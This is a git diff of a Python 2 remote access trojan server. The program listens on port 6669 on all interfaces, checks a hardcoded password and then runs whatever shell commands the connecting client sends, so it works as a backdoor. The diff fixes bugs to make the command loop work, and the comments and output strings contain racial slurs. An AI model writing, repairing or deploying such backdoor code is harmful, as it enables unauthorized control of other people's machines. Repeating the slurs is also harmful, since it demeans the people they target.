@@ -8,8 +8,6 @@ import os
 import subprocess
 
 #grab some easy system info to pass to client upon connection
-uname = subprocess.call('uname -a', shell=True)
-w = subprocess.call('w', shell=True)
 
 #Set server to accept connections from any interface, port 6669
 BINDIP = "0.0.0.0"
@@ -23,25 +21,28 @@ server.listen(3)
 def commands(command):
     command = command.rstrip()
     if command[0] != "!":
-        command = command[1:]
-        result = subprocess.call(command, shell=True)
+        result = str(subprocess.call(command, shell=True))
         return result
     elif command[0] == "!":
-        #TODO add custom scripts
+        command = command[1:]
+        print "nibba punch"
     else:
         print "\nNgr wtf did you do, this should literally be impossible to call\n"
+        sys.exit(1)
 
 #main server functions, command parsing
-def shell():
+def shell(clientSocket):
     while True:
         clientSocket.send("\nECHI> ^-^")
         buffer = ""
         while "\n" not in buffer:
             buffer += clientSocket.recv(1024)
-        if buffer == 'quit':
+        if buffer == 'quit'.rstrip():
             clientSocket.send("[*] Terminating Connection. Goodbye.")
             clientSocket.close()
             break
+        elif buffer == "\n":
+            continue
         else:
             output = commands(buffer)
             clientSocket.send(output)
@@ -53,9 +54,8 @@ def handleClient(clientSocket):
     hashpass = clientSocket.recv(1024)
     if hashpass == 'gunclawpythonratniBBa':
         #send the w and uname to client, jump to shell loop
-        clientSocket.send("\n[+] Accepted Connection\nCurrent Users (w):\n"+w+"\nuname -a:\n"+uname+"\n")
-
-        shell()
+        clientSocket.send("\n[+] Accepted Connection\n")
+        shell(clientSocket)
     else:
         clientSocket.close()
 
@@ -64,7 +64,7 @@ def handleClient(clientSocket):
 def main():
     while True:
         client,addr = server.accept()
-        clientHandler = threading.Thread(target=handleClient,args(client,))
+        clientHandler = threading.Thread(target=handleClient,args=(client,))
         clientHandler.start()
 
 
